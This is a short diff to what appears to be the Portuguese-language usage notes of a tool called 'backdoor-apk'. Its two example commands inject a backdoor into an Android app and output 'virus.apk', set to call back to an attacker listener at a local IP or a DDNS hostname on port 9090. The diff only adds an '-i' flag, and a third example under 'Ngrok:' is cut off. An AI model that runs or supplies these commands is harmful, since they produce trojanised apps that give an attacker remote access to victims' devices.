@@ -9,11 +9,11 @@ Para ajuda
 
 IP:
 
-./backdoor-apk test.apk 192.168.1.143 9090 virus.apk
+./backdoor-apk -i test.apk 192.168.1.143 9090 virus.apk
 
 Host/DDNS:
 
-./backdoor-apk test.apk fuckthisn0ip.ddns.net 9090 virus.apk
+./backdoor-apk -i test.apk fuckthisn0ip.ddns.net 9090 virus.apk
 
 Ngrok:
 
